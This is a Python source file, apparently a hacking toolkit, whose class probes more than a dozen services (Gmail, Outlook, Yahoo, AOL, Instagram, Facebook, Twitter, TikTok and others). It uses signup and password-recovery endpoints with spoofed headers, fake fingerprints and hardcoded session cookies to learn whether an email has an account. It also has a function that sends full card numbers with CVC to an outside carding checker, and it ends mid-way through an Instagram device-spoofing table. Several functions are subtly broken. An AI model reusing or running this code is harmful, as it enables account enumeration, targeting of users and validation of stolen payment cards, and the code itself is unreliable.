import os, sys, random

try:
    import requests, user_agent, json, secrets, hashlib, urllib, uuid, re, mechanize, instaloader
    from user_agent import generate_user_agent

except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install names')
    os.system('pip install urllib')
    os.system('pip install hashlib')
    os.system('pip install uuid')
    os.system('pip install instaloader')
    os.system('pip install mechanize')


# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
class Azoz_check_email:

    def gmail(email: str) -> str:
        url = 'https://android.clients.google.com/setup/checkavail'
        headers = {
            'Content-Length': '98',
            'Content-Type': 'text/plain; charset=UTF-8',
            'Host': 'android.clients.google.com',
            'Connection': 'Keep-Alive',
            'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)', }
        data = json.dumps({
            'username': str(email),
            'version': '3',
            'firstName': 'GDO_0',
            'lastName': 'GDOTools'})
        res = requests.post(url, data=data, headers=headers)
        if res.json()['status'] == 'SUCCESS':
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def hotmail(email: str) -> str:
        url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + str(email) + "&_=1604288577990"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": str(generate_user_agent()),
            "Connection": "close",
            "Host": "odc.officeapps.live.com",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
            "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
            "uaid": "d06e1498e7ed4def9078bd46883f187b",
            "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
        res = requests.post(url, data="", headers=headers).text
        if ("Neither") in res:
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def outlook(email: str) -> str:
        url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + str(email) + "&_=1604288577990"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": str(generate_user_agent()),
            "Connection": "close",
            "Host": "odc.officeapps.live.com",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
            "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
            "uaid": "d06e1498e7ed4def9078bd46883f187b",
            "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
        res = requests.post(url, data="", headers=headers).text
        if ("Neither") in res:
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def mailru(email: str) -> str:
        url = "https://account.mail.ru/api/v1/user/exists"
        headers = {
            "User-Agent": str(generate_user_agent())}
        data = {'email': str(email)}
        res = requests.post(url, data=data, headers=headers)
        if str(res.json()['body']['exists']) == False:
            return True

        else:
            return {'status': 'error', 'email': False}

    def yahoo(email: str) -> str:
        email = str(email)
        email = email.split('@')[0]
        url = "https://login.yahoo.com/account/module/create?validateField=userId"
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-length': '7423',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'cookie': 'PH=l=en-JO; cmp=t=1649967133&j=0; OTH=v=1&d=eyJraWQiOiIwMTY0MGY5MDNhMjRlMWMxZjA5N2ViZGEyZDA5YjE5NmM5ZGUzZWQ5IiwiYWxnIjoiUlMyNTYifQ.eyJjdSI6eyJndWlkIjoiUVM0Uk1FNVM1NTdEQlg2TTdOVFFRUTdHTlUiLCJwZXJzaXN0ZW50Ijp0cnVlLCJzaWQiOiJERWI2ZmRZN1BwQVUifX0.qS4v0LTtpXd4vhydwS6vpL9MANSOMDMZEYWffFSxshbnuwRCzeUzJbwM2p7nPMwYV96yEFCkM0B8Lo--XHoBQvQszdP_-M-HuzLttwUwkzkqDpZyo6Lzm5bAnbh6B3P-kTcNBHlCoSg9N-SExB0OrppOO2gONQqoR25mLHXhhnY; A1=d=AQABBB409GECEJnQ0nfMctyiH6Cq-PmrCeMFEgEABgLQWWIzY2Jcb2UB_eMBAAcIHjT0YfmrCeMID9DBO57ZmNoDBDj1XbSi9wkBBwoB3w&S=AQAAAjb2LJb55ay2ij3P5hQhTG8; A3=d=AQABBB409GECEJnQ0nfMctyiH6Cq-PmrCeMFEgEABgLQWWIzY2Jcb2UB_eMBAAcIHjT0YfmrCeMID9DBO57ZmNoDBDj1XbSi9wkBBwoB3w&S=AQAAAjb2LJb55ay2ij3P5hQhTG8; B=e62dbv5gv8d0u&b=4&d=6ZQJIRhtYFgpJyr7JyZD&s=1a&i=0ME7ntmY2gMEOPVdtKL3; GUC=AQEABgJiWdBjM0Id8gRd; FS=v=1&d=Sloq608oHDIvM2JuXcI4Gn9LK3_mICxQM3wH9IpTUuhixjO_VCNu~A; F=d=Gd70Kyk9vQ--; A1S=d=AQABBB409GECEJnQ0nfMctyiH6Cq-PmrCeMFEgEABgLQWWIzY2Jcb2UB_eMBAAcIHjT0YfmrCeMID9DBO57ZmNoDBDj1XbSi9wkBBwoB3w&S=AQAAAjb2LJb55ay2ij3P5hQhTG8&j=WORLD; AS=v=1&s=Cgvhb3Xg&d=A627bc5c4|SI2GnZf.2Sr3BNg89zpo_CsNpKuGFl4HUY7VHVfbraWyc8Ii93qDVlDfOt1BfiR7XCEZ21NvQDWrQraqbYJyOJYpsIH0OvCsxXiN8AGzuKcqHrgfGUtOZZrzS7O.VkvbdCiSNYD_w9OB6ML3Y8NMOiMYT_MiAgefNsF_54dXFyJdm4rdq1W.bJhN_PLPvnrKNDEd7saaFV3TnLk.b.kYolEgMoWWAkD71Of5UCjkqQNaQk8RIunPxxXkRXHZwr1ypRWsnBEuqv5oQrEDCiqHFvF8u25Ofg2gKdnPDbFeJ9RleaTB45uuY5sZUv1mdsokSKD6_ahRvGkWfTnrPZzt6E28PE28s0fooo2qY3yUltuO1w.xKUCKkKbWJQyjxXpqTm3hgOwJ66.3I2TIf5r0vA0r43pnZVLl2rttIk4R1ABgy9Wy7OOqga8ZVE3o1l0hHz419cDgN1Hzb0Fexz..nP9ME4F7VWfn8oo.k9pMZYDtHhRMM1kGGmsex0pBbD.QdtUhpuVR4oHP_U7ap4DOcKCGYp2XVml6Z.9xRcb3m_VOukhZ1zwEpcjT6xXJAjZ7AgfC3l7QBLw2NnD0Mtuqh35qDDEABh4dM.YlhgT72EYqSbl8MnvZ7W1q0bk3SMaqQdwbAGle4W1j_uPr0yu90HSPNKzeQ2K5GsPumTtVNzT353rVPBfwGAIDMe1wqR5csd8SV4iFjZ8Y6r..RZT_XsKxT2JOL1QhaTFkx0INLwy88kv._Vv_cBMwcEYUz0LQ9OLwajl6R7b5AYwwk.B4EXpf7DzynJaWtaerDs461oLGbqD_ljVUdWAy.U5mcYXnWqzqseI7fC6W4HvXdAaCIC2qmrAgjow9hJqXDIvkXODlsrZ.usoNnX44L7X8ybtYCKvH4RcQttBv6b0X2jcI~A|B627bc602|8.xHz7z.2TpHZLxVO1hodGUaeVUeU4gERiIt7J2uXM7cv4.YcovtTNaxgcIeRQzeGiqrbxcu1WyDHogAGcIglonu5OSTNDoMeCDAxtZH1Od166YwYdZDIzr0hcNc_epXkOw1KoLhXbyBR5MCTGhdrG0BJoG5njJC9n5N2JJx2P0aWBC9bPoIThLWGi9Wf8wfI4MP3mhqA9lF2eFUkQEX6A2CiocpPLhQbmtgRKbVM1Q3ncBSeVaKuhQOqNcvHOqCSLgppcJg2sBtkJLzet12UCSy8JORfHf6Dc3DMT8QgifRRoGTBoAGs_SOI6hOcNExCo9D5ImvN.lKHPMymFxqnW4pVaq2PBcY7f2t4xNLcqBYPV.O2TCmgvni7WYaq7A0zYaQCJWFcBkzB4BcXX19s8Eeidj213exUfkBq8zgrPQsB0IPQD0KCe.LXf6hNY1dr4vp1rTBLRchdHhzbM2upz50JIDW87taVyq.ZU04zTTOg4KQwv9Hn9poWN_Y2VeiU68nclbo60iQRPXCa5mqucblBHNAxUHuGNiUlD5xYj3N2W.oiUMs7_9esA3eOUubDjN8vj_FAqE9IKrJqNiyOkWOniHFTJ77toR.uk1PW8Bo21lZocUzsa1s9WdzLC5HusiiMErYDEnMdRIyu8_.ZxCeKhvNbi8cbSI3.ZentJbZMr1y5sZrarxJCGi1OGoUBEuHWbaZsRASqKJMiX4I95kvg.aFU6XlIQCbKbVyJPCnf7lMb0bEsP6oYnEiqlME_r8ejtGRi9Nu1vgt5HvJaEjwOlYHZnmO21kqttxWUkhORs_He7F81_HHtWVAez1R6a2WP3qh1MT14ppKSBr6851gallOGB0AJOi2P.9vJaPSwzunhCFzWdpgLH9rx4LTKgseKH1NLyrsvKnmf.AMPdYnZR1NBJSvBJ9kknOWSXWyNFcfOgVyUaHzJKMG.QF.JC3DqEcIsJCW7w12wCyb422YcTwgWhUK1I19S8w9HjhiYg--~A',
            'origin': 'https://login.yahoo.com',
            'referer': 'https://login.yahoo.com/account/create?.intl=xa&.lang=ar&src=ym&specId=yidregsimplified&activity=mail-direct&pspid=959521375&.done=https%3A%2F%2Fmail.yahoo.com%2Fm%2F%3F.intl%3Dxa%26.lang%3Dar&done=https%3A%2F%2Fmail.yahoo.com%2Fm%2F%3F.intl%3Dxa%26.lang%3Dar&intl=xa&context=reg',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()), }
        data = {
            'browser-fp-data': '{"language":"ar","colorDepth":24,"deviceMemory":4,"pixelRatio":1,"hardwareConcurrency":4,"timezoneOffset":-180,"timezone":"Asia/Riyadh","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":5,"hash":"2c14024bf8584c3f7f63f24ea490e812"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 4600 Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":48,"hash":"62d5bbf307ed9e959ad3d5ad6ccd3951"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1652192386973,"render":1652192386434}}',
            'specId': 'yidregsimplified',
            'crumb': 'IHW88p4nwpv',
            'acrumb': 'Cgvhb3Xg',
            'userid-domain': 'yahoo',
            'userId': str(email),
            'password': '@GDOTools', }
        res = requests.post(url, headers=headers, data=data).text
        if ("userId") in res:
            return {'status': 'error', 'email': False}

        else:
            return {'status': 'Success', 'email': True}

    def aol(email: str) -> str:
        email = str(email)
        email = email.split('@')[0]
        url = 'https://login.aol.com/account/module/create?validateField=yid'
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-length': '18023',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'cookie': 'A1=d=AQABBGBeeWICEBR5epkCARe46kFw6ViOQ_AFEgEBAQGvemKDYgAAAAAA_eMAAA&S=AQAAAp3JQ6CyW2qRJcMsBzHGVvU; A3=d=AQABBGBeeWICEBR5epkCARe46kFw6ViOQ_AFEgEBAQGvemKDYgAAAAAA_eMAAA&S=AQAAAp3JQ6CyW2qRJcMsBzHGVvU; A1S=d=AQABBGBeeWICEBR5epkCARe46kFw6ViOQ_AFEgEBAQGvemKDYgAAAAAA_eMAAA&S=AQAAAp3JQ6CyW2qRJcMsBzHGVvU&j=WORLD; GUC=AQEBAQFieq9ig0IfzwR5; rxx=2bkczirpbih.2q6rpdsb&v=1; AS=v=1&s=JYNxcuAB&d=A627ab0eb|5n7NNlX.2Tqja_1ZC6lprFtAflUVdSswdgLRxIPQFqE9yPLfNXNQGllEgjcaz2MSyNOF0HA9XirM0hGhPu6hRyuyv6NS5uzzU2MRaRQf.1YBAQ8FypG1m_xQXAtuSInDrAwsMOptRW4zfkTgorDT4mTAhLg6RTvtz.RlGfCdtaQ4BBDOfp7jAYaYk.VJlzoY75HEqitjywIRo5cxa2LE6o5SUyxNOi7S_X3k_SPXAVdV.Pie3M8oZSqscWmfYaFDf586bpqdXlRbtd9NfqqCnsm39F_qAPBPvWHWieu4eZ4Guhk.MRMp7Daew_rlTFks0DO5LZYOCyO3RrW3LO3QaHRTvTBTaXP4RsdfXTOXPejofBwqmWSbUlACa4xD1EKndabLWQmEoy1AEUMoSbwgJMxI_j7xuQHqBgjCanjm8A6GOXCZKM44DjwdQdaMnR6GrHEfBfKds9z.7gjHKBoZ2jkWj7Hk7hPMzDGRBkqU.TWCGZRumYVYV8blYxEIS.H9qySKbh3SBBI8MIgkMqBNciHX3QnqQrc_CuA1uBOx7GHKgnI7pemzJnVMGwyYsAGU4UQRwAVGcDrHZH76hH..grS5ceMIZJSVt6nAcvYiTMElRUgLqk4RORTkyF9XbLMB9_U2I_ZVaERHP3X7j7f77RdHq2UlR68eZ_G5RY6ZrgfwFvy1Ptrd9WdFYaab69sfGI8SVXk2dtdR5udVorhaBdtoNxJ5PIy0Ue_qMPhxcsw4VzSExlyyNSaF0SFoSH5fK8kFVQ0IIBIWO_d0ik6d9azkHxffaa7MJpjYfsHmHpERb2hEkyr7uJzTQTf0H8NBfQdcQD8P9ja69DD7Ahdacge_a9D4QGaLgMvQi481iZMNd5Dy46uoeco5T.slB_psK4WxbBJgP7p6hgyb_wkDzvUhd_3ym5sQe1cBySzHgXSMyzsEurBQZKaMHv9302Cj6iNUZ2jjtMkAVdsh~A|B627ab2cd|x0gk8rH.2TpbbztShpG57nIccQOKaEGxqulmFIimnSbIetxQBy35pQAyeLh0g4kZXfUcZ8gS0KtJhnntdd169n74ag_k2YnldeTcAixJ8Oe1U9eEwr4TEKjAn5ew0omTSMojewjLD76vbkEv.zZYyCrRxd5vfs3vmQxAV_f6Y0sOWtsUeIu3OvEzUyK.1trUfGvmn7d3hvyFbF.OTRqd._NMsXRn2QVZ.T5RjYrog5983WaKy_9x1YPoBUNH4QPKi0zZBP9iMgx8Tlsrxhn4zs9Zyr3IiqPFbxjEuBh4G78xoEv7z6_PrYOwB37XEbTdaaeXyPFsSGhZf4bQovQopXVbHe.9nbDzDYkfdXD6d9wmf6jvSEex9a9eEu8Z.14NuIQZJcy_c6_PP5H0eXQAWO6LOsW7CtqdeDlLd74M9jUU5yseMxzkN0HSawwGQ.HU.XZFjoOjowHAX1bsDGRuWObSamI1LdvanTCHZZ6TICNO8lT9GjBWDYK.h6.ojgs.tCAAXzYPMf6UOHvrjtlwaCmODGFlndZMASPIp9IyDMRT9gC52spPRpBQJZOpJUt8YDEY6zKB5r2SsHH.ssGgtrnS3tlCg6rx8k.wEakhoSpj2ezEMO4IAODDXV0paODum6McXkpaxliXReHLYdtXIM9t5smt_PeP92ttd69oDB.zVFsEms7tdF1SQWbmUF.4plddWEwfn6FNVdj7TpJvpTAxjaso_xliccUrnkpUGvH1IUv11w4Pok0k92JLzk2AXJ5Ak_5R51n2X_Oc88nJKif3EZK7ly7lgMXtWaURJx2Zj4.88SxdyHNtRzmHFvkAwmxtDmjgj5OCF7m38h.4TZuT3.D3c7uhs0XPEZARricsnApvw1dUBRY0E3vvSU.S_4zHPhWn7BHQz1nySvei.tQaogRmeBpFHvzS3QNKSWksRu1w7T8O2RDtnr7pzs5VzPifkiXOKw--~A',
            'origin': 'https://login.aol.com',
            'referer': 'https://login.aol.com/account/module/create?validateField=yid%5C',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-requested-with': 'XMLHttpRequest', }
        data = {
            'browser-fp-data': '{"language":"ar","colorDepth":24,"deviceMemory":4,"pixelRatio":1,"hardwareConcurrency":4,"timezoneOffset":-180,"timezone":"Asia/Riyadh","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":5,"hash":"2c14024bf8584c3f7f63f24ea490e812"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 4600 Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":48,"hash":"62d5bbf307ed9e959ad3d5ad6ccd3951"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1652124464147,"render":1652124464497}}',
            'specId': 'yidReg',
            'crumb': 'YLO.LxuwQbD',
            'acrumb': 'JYNxcuAB',
            'done': 'https://www.aol.com',
            'tos0': 'oath_freereg|us|en-US',
            'yid': str(email),
            'password': '@GDOTools',
            'shortCountryCode': 'US'}
        res = requests.post(url, headers=headers, data=data).text
        if ('"yid"') in res:
            return {'status': 'error', 'email': False}

        else:
            return {'status': 'Success', 'email': True}

    def instagram(email: str) -> str:
        url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8,ar-SA;q=0.7',
            'content-length': '61',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'ig_cb=2; ig_did=BB52B198-B05A-424E-BA07-B15F3D4C3893; mid=YAlcaQALAAHzmX6nvD8dWMRVYFCO; shbid=15012; rur=PRN; shbts=1612894029.7666144; csrftoken=CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/emailsignup/',
            'sec-ch-ua': '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
            'sec-ch-ua-mobile': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-csrftoken': 'CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR0Plwj5om112fwzrrYnMNjMLPnyWfFFq1tG7MCcMv5_vN9M',
            'x-instagram-ajax': '72bda6b1d047',
            'x-requested-with': 'XMLHttpRequest'}
        data = {
            'email': str(email),
            'username': str(email),
            'first_name': '@GDOTools',
            'opt_into_one_tap': 'false'}
        try:
            res = requests.post(url, data=data, headers=headers).json()["errors"]["email"]
            return {'status': 'Success', 'email': True}

        except:
            return {'status': 'error', 'email': False}

    def facebook(email: str) -> str:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        br.addheaders = [('User-agent',
                          'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2821.96 Safari/537.36')]
        br.open(
            "https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1")
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form["email"] = email
        br.submit()
        res = br.geturl()
        if "https://mbasic.facebook.com/login/device-based/ar/login/?ldata=" in res:
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def twiter(email: str) -> str:
        rs = requests.Session()
        url = f"https://api.twitter.com/i/users/email_available.json?email={email}"
        rs.headers = {
            'User-Agent': generate_user_agent(),
            'Host': "api.twitter.com",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", }
        res = rs.get(url).json()
        if res['valid'] == True:
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def tiktok(email: str) -> str:
        url = "https://api2-t2.musical.ly/aweme/v1/passport/find-password-via-email/?version_code=7.6.0&language=ar&app_name=musical_ly&vid=43647C38-9344-40A3-AD8E-29F6C7B987E4&app_version=7.6.0&is_my_cn=0&channel=App%20Store&mcc_mnc=&device_id=6999590732555060741&tz_offset=10800&account_region=&sys_region=SA&aid=1233&screen_width=1242&openudid=a0594f8115e0a1a51e1a31490aeef9afc2409ff4&os_api=18&ac=WIFI&os_version=12.5.4&app_language=ar&tz_name=Asia/Riyadh&device_platform=iphone&build_number=76001&iid=7021194671750481669&device_type=iPhone7,1&idfa=20DB6089-D1C6-49EF-8943-9C310C8F1B5D&mas=002ed4fcfe1207217efade4142d0b05e0c845e118f07206205d6a8&as=a11664d78a2e110bd08018&ts=16347494182"
        headers = {
            'Host': 'api2-t2.musical.ly',
            'Cookie': 'store-country-code=sa; store-idc=alisg; install_id=7021194671750481669; odin_tt=7b67a77e780e497b1c89d483072f567580c860fe622a9ad519c8af998a287f424ed5f97297928981fa70ca6e8cb2648ebc46af23c9c9588a540567c77f877d307588080b16d8b92d3c3f875da9cd2291; ttreq=1$ee9fd401f276e956ba82d3ffd7392ffa6829472d',
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': str(generate_user_agent()),
            'Accept-Language': 'ar-SA;q=1',
            'Content-Length': '25',
            'Connection': 'close'}
        data = {"email": email}
        req = requests.post(url, headers=headers, data=data)
        if "Sent successfully" in req.text:
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def epicgames(email: str) -> str:
        url = "https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/sendFriendRequest"
        data = f"inputEmail={email}&tab=connections"
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'fr-FR,fr;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Host': 'accounts.launcher-website-prod07.ol.epicgames.com',
            'Origin': 'https://accounts.launcher-website-prod07.ol.epicgames.com',
            'Pragma': 'no-cache',
            'Referer': 'https://accounts.launcher-website-prod07.ol.epicgames.com/launcher/addFriends',
            'sec-ch-ua-mobile': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': str(generate_user_agent()), }
        req = requests.post(url, headers=headers, data=data)
        if ("fieldValidationError") in req.cookies:
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def godaddy(email: str) -> str:
        url = "https://sso.godaddy.com/v1/api/idp/recovery/password/?username={email}&app=dashboard.api"
        headers = {
            'User-Agent': str(generate_user_agent()),
            'Pragma': 'no-cache',
            'Accept': '*/*', }
        req = requests.post(url, headers=headers)
        if ("account_email") in req.cookies:
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def gap(email: str) -> str:
        url = "https://secure-www.gap.com/my-account/xapi/v2/create-account/verify-email"
        data = {'emailAddress': f'{email}'}
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Host': 'secure-www.gap.com',
            'Origin': 'https://secure-www.gap.com',
            'Referer': 'https://secure-www.gap.com/my-account/sign-in',
            'User-Agent': str(generate_user_agent()), }
        req = requests.post(url, headers=headers, data=data)
        if ("isEmailRegistered:false") in req.cookies:
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def noon(email: str) -> str:
        url = "https://login.noon.com/_svc/customer-v1/auth/reset_password"
        headers = {
            'User-Agent': str(generate_user_agent()),
            'Pragma': 'no-cache',
            'Accept': '*/*',
            'origin': 'https://login.noon.com',
            'referer': 'https://login.noon.com/uae-en/reset', }
        data = {'email': str(email), }
        req = requests.post(url, headers=headers, data=data)
        if ("ok") in req.cookies:
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def sendgrid(email: str) -> str:
        url = "https://api.sendgrid.com/v3/public/signup/username/{email}"
        headers = {
            'User-Agent': str(generate_user_agent()),
            'Pragma': 'no-cache',
            'Accept': '*/*', }
        req = requests.post(url, headers=headers)
        if ("Contains:204") in req.cookies:
            return {'status': 'Success', 'email': True}

        else:
            return {'status': 'error', 'email': False}

    def visa_card(cc: str, mm: str, yy: str, cvc: str) -> str:
        card = str(f"{cc}|{mm}|{yy}|{cvc}")
        url = "https://checker.visatk.com/ccn1/alien07.php"
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-Length': '57',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': '__gads=ID=42ac6c196f03a9b4-2279e5ef3fcd001d:T=1645035753:RT=1645035753:S=ALNI_MZL7kDSE4lwgNP0MHtSLy_PyyPW3w; PHPSESSID=tdsh3u2p5niangsvip3gvvbc12',
            'Host': 'checker.visatk.com',
            'Origin': 'https://checker.visatk.com',
            'Referer': 'https://checker.visatk.com/ccn1/',
            'sec-ch-ua': '"Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': str(generate_user_agent)}
        data = {
            'ajax': '1',
            'do': 'check',
            'cclist': card}
        req = requests.post(url, headers=headers, data=data).text
        if '"error":0' in req:
            many = req.split("[Charge :<font color=green>")[1].split("</font>] [BIN:")[0]
            message = {'status': 'Success', 'many': str(many), 'Card': str(card)}
            return message

        else:
            return False


# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------
# -------------------------[CoDe BY GDØ]------------------------

class gdo_drow:

    def Server_IG():
        vers = '136.0.0.34.124'
        virs = '208061712'
        de = {
            'one_plus_7': {'app_version': vers, 'android_version': '29', 'android_release': '10.0', 'dpi': '420dpi',
                           'resolution': '1080x2340', 'manufacturer': 'OnePlus', 'device': 'GM1903',
                           'model': 'OnePlus7', 'cpu': 'qcom', 'version_code': virs},
            'one_plus_3': {'app_version': vers, 'android_version': '28', 'android_release': '9.0', 'dpi': '420dpi',
                           'resolution': '1080x1920', 'manufacturer': 'OnePlus', 'device': 'ONEPLUS A3003',
                           'model': 'OnePlus3', 'cpu': 'qcom', 'version_code': virs},
            'samsung_galaxy_s7': {'app_version': vers, 'android_version': '26', 'android_release': '8.0',
                                  'dpi': '640dpi', 'resolution': '1440x2560', 'manufacturer': 'samsung',
                                  'device': 'SM-G930F', 'model': 'herolte', 'cpu': 'samsungexynos8890',
                                  'version_code': virs},
            'huawei_mate_9_pro': {'app_version': vers, 'android_version': '24', 'android_release': '7.0',
                                  'dpi': '640dpi', 'resolution': '1440x2560', 'manufacturer': 'HUAWEI',
                                  'device': 'LON-L29', 'model': 'HWLON', 'cpu': 'hi3660', 'version_code': virs},
            'samsung_galaxy_s9_plus': {'app_version': vers, 'android_version': '28', 'android_release': '9.0',
                                       'dpi': '640dpi', 'resolution': '1440x2560', 'manufacturer': 'samsung',
                                       'device': 'SM-G965F', 'model': 'star2qltecs', 'cpu': 'samsungexynos9810',
                                       'version_code': virs},
            'one_plus_3t': {'app_version': vers, 'android_version': '26', 'android_release': '8.0', 'dpi': '380dpi',
                            'resolution': '1080x1920', 'manufacturer': 'OnePlus', 'device': 'ONEPLUS A3010',
                            'model': 'OnePlus3T', 'cpu': 'qcom', 'version_code': virs},
            'lg_g5': {'app_version': vers, 'android_version': '23', 'android_release': '6.0.1', 'dpi': '640dpi',
